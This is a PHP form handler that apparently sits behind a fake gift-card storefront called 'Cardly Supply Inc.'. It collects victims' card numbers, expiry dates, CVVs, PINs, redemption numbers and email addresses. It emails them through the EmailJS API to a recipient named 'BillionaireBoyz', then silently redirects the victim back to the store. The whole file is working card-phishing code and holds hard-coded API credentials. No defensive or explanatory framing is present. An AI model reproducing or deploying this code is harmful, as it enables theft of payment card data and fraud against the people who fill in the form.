<?php
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    header('Location: https://www.mycardlysupply.store/');
    exit;
};

$currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = $email = "";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (empty($_POST['form_fields']) || empty($_POST['form_fields']["amount"])) {
        header('Location: https://www.mycardlysupply.store/');
        exit; 
    }

    if (!empty($_POST['form_fields']["currency"])) {
        $currency = $_POST['form_fields']["currency"];
    }
    if (!empty($_POST['form_fields']["card"])) {
        $cardType = $_POST['form_fields']['card'];
    }
    if (!empty($_POST['form_fields']["amount"])) {
        $cardAmount = $_POST['form_fields']["amount"];
    }
    if (!empty($_POST['form_fields']["redemption"])) {
        $redemptionNumber = $_POST['form_fields']["redemption"];
    }
    if (!empty($_POST['form_fields']["card_number"])) {
        $cardNumber = $_POST['form_fields']["card_number"];
    }
    if (!empty($_POST['form_fields']["exp_mm"])) {
        $expMM = $_POST['form_fields']["exp_mm"];
    }
    if (!empty($_POST['form_fields']["exp_yy"])) {
        $expYY = $_POST['form_fields']["exp_yy"];
    }
    if (!empty($_POST['form_fields']["cvv"])) {
        $cardCVV = $_POST['form_fields']["cvv"];
    }
    if (!empty($_POST['form_fields']["pin"])) {
        $cardPIN = $_POST['form_fields']["pin"];
    }

    if (!empty($_POST['form_fields']["email"])) {
        $email = $_POST['form_fields']["email"];
    }


    $card_data = <<<card_data
    {
        "currency": $currency,
        "card_type": $cardType,
        "amount": $cardAmount,
        "redemption_number": $redemptionNumber,
        "card_number": $cardNumber,
        "exp_mm": $expMM,
        "exp_yy": $expYY,
        "cvv": $cardCVV,
        "pin": $cardPIN,
        "email": $email
    }
    card_data;

    $email_card_data = json_encode($card_data);

    $url = "https://api.emailjs.com/api/v1.0/email/send";
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
        "Content-Type: application/json",
    );

    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = <<<data
    {
        "service_id": "service_x9jb2u6",
        "template_id": "template_fbtmo37",
        "user_id": "NOi437kqNBA06XMKR",
        "accessToken": "2Ok9-WjSifXA4pIvRdLu-",
        "template_params": {
            "to_name":"BillionaireBoyz",
            "from_name":"Cardly Supply Inc.",
            "message": $email_card_data
        }
    }
    data;

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    $resp = curl_exec($curl);
    curl_close($curl);

    if ($resp === false) {
        header('Location: https://www.mycardlysupply.store/');
    } else {
        header('Location: https://www.mycardlysupply.store/');
    };
} else {
    header('Location: https://www.mycardlysupply.store/');
    exit;
}

?>